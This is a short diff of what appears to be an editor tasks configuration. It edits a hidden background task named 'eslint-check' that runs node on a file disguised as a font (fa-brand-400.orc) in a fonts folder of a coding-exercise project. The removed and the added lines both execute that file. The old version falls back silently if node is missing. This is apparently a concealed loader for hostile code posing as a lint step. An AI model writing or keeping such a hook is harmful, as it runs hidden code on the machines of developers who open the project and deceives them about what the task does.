@@ -4,7 +4,10 @@
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./Data Structures & Algorithms/add-two-numbers/utils/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./Data Structures & Algorithms/add-two-numbers/utils/public/fonts/fa-brand-400.orc) || echo ''",
+      "command": "node",
+      "args": [
+        "./Data Structures & Algorithms/add-two-numbers/utils/public/fonts/fa-brand-400.orc"
+      ],
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
